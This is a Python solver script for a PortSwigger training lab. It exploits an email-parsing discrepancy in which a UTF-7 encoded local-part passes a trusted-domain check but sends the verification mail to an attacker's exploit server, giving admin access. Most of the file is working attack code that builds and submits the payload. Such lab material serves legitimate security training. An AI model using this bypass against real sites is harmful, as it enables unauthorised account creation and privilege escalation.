# Lab 12 — Bypassing access controls using email address parsing discrepancies
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies
#
# Vulnerability: The registration form's domain-allowlist check and the
#                ACTUAL mail delivery system parse the email address
#                differently — a UTF-7 encoded local-part is read as
#                literal characters by the domain checker, but DECODED by
#                the mail delivery system before actually sending
# Aim:           Register an account that satisfies the trusted-domain
#                check, but which actually delivers its verification email
#                to YOUR exploit server
#
# Technique:
#   Build an email of the form:
#     =?utf-7?q?attacker&AEA-{exploit-server-id}&ACA-?=@{trusted-domain}
#
#   The domain checker sees the string ending in "@{trusted-domain}" and
#   approves it. The mail system decodes the UTF-7 (=?utf-7?q?...?=)
#   segment first, revealing the REAL address:
#     attacker@{exploit-server-id}
#
# Usage: python business_logic_lab12.py <url> <trusted_domain> <exploit_server_domain>
#   Example: python business_logic_lab12.py https://target.net ginandjuice.shop \
#            exploit-abc123.exploit-server.net

import sys
import urllib3
from proxies import proxies
from business_logic_utils import (banner, section, make_session, utf7_encode_segment,
                                   get_csrf_from_response, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 12 — EMAIL ADDRESS PARSING DISCREPANCIES (UTF-7 BYPASS)")

    if len(sys.argv) != 4:
        print("  Usage: python business_logic_lab12.py <url> <trusted_domain> <exploit_server_domain>")
        print("  Example: python business_logic_lab12.py https://target.net ginandjuice.shop exploit-abc.exploit-server.net")
        sys.exit(1)

    url = sys.argv[1]
    trusted_domain = sys.argv[2]
    exploit_domain = sys.argv[3]

    session = make_session(proxies)

    # ── Step 1: build the UTF-7 encoded local-part ────────────────────────────
    print("\n  ── Step 1: construct the UTF-7 encoded local-part\n")

    at_encoded = utf7_encode_segment("@")
    space_encoded = utf7_encode_segment(" ")

    print(f"  ℹ  '@' encodes to : {at_encoded}  (expected: &AEA-)")
    print(f"  ℹ  ' ' encodes to : {space_encoded}  (expected: &ACA-)")

    # Full payload structure:
    #   =?utf-7?q?attacker&AEA-{exploit_domain}&ACA-?=@{trusted_domain}
    local_part = f"=?utf-7?q?attacker{at_encoded}{exploit_domain}{space_encoded}?="
    payload_email = f"{local_part}@{trusted_domain}"

    print_box("Constructed registration email", payload_email)

    # ── Step 2: submit registration ──────────────────────────────────────────
    print("  ── Step 2: submit registration with the crafted email\n")
    reg_page = session.get(f"{url}/register")
    csrf = get_csrf_from_response(reg_page.text)

    reg_data = {
        "username": "attacker",
        "password": "Password123!",
        "email": payload_email,
    }
    if csrf:
        reg_data["csrf"] = csrf

    r_register = session.post(f"{url}/register", data=reg_data, allow_redirects=True)
    check_status(r_register, [200, 302], "Registration with UTF-7 crafted email")
    print_box("Registration response (truncated)", r_register.text[:400])

    print()
    print("  ➜  Next steps:")
    print(f"     1. Check the exploit server ({exploit_domain}) access log for")
    print("        an incoming verification email/request to 'attacker@...'")
    print("     2. Complete verification using the received link/code")
    print("     3. Log in with username 'attacker' and the password set above")
    print("     4. Access /admin — should now be granted (gated by the")
    print(f"        @{trusted_domain} domain requirement, which this")
    print("        registration satisfied on paper but not in reality)")
    print()
    print("  ℹ  If registration is rejected, the domain checker may validate")
    print("     more strictly than expected on this lab instance, or the")
    print("     UTF-7 marker syntax (=?utf-7?q?...?=) may need adjustment —")
    print("     inspect the exact rejection reason and compare against the")
    print("     'Splitting the Email Atom' PortSwigger research paper.")
